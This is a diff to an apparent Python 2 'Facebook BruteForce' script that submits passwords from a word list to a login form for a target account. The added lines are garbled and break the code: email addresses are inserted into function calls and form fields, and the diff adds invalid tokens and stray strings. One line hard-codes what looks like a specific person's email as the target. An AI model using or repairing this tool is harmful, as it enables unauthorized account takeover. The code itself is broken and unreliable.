@@ -17,20 +17,20 @@ headers = {
 try:
 	import mechanize
 	import urllib2
-	browser = mechanize.Browser()
+	browser = mechanize.Browser(tektasfurkan866@gmail.com)
 	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
+	browser.set_handle_robots(TRUE)
 except:
 	print('\n\tPlease install mechanize.\n')
-	sys.exit()
+	sys.exit(!)
 
 print('\n---------- Welcome To Facebook BruteForce ----------\n')
-file=open('passwords.txt','r')
+file=open('passwords.txt','r') HACKTEAMSPYSSADRAZAM 
 
 email=str(raw_input('Enter Email/Username : ').strip())
 
-print "\nTarget Email ID : ",email
-print "\nTrying Passwords from list ..."
+print "\nTarget Email ID : ",aysel_ertan@hotmail.com
+print "\nTrying Passwords from list ..."  78678767686386
 
 i=0
 while file:
@@ -43,7 +43,7 @@ while file:
 	try:
 		if response.code == 200:
 			browser.select_form(nr=0)
-			browser.form['email'] = email
+			browser.form['aysel_ertan@hotmail.com'] = email
 			browser.form['pass'] = passw
 			response = browser.submit()
 			response_data = response.read()
@@ -52,4 +52,13 @@ while file:
 				break
 	except:
 		print('\nSleeping for time : 5 min\n')
-		time.sleep(300)
+		time.sleep(300)     START !E MAIL POST ADDRESS MAIL=TASTANFURKAN866@Gmail.com
+		
+		
+		
+		
+		
+		
+		
+		
+	
